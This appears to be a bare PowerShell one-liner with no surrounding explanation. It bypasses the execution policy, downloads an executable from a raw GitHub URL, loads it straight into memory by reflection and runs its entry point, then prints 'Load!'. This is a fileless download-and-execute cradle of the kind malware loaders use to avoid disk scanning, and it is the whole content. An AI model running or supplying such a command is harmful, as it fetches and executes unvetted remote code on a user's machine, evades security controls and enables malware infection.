powershell -ep bypass -c "$data = (New-Object Net.WebClient).DownloadData('https://raw.githubusercontent.com/.../my-app.exe'); [System.Reflection.Assembly]::Load($data).EntryPoint.Invoke($null, $null)"

Write-Host "Load!" -ForegroundColor Cyan
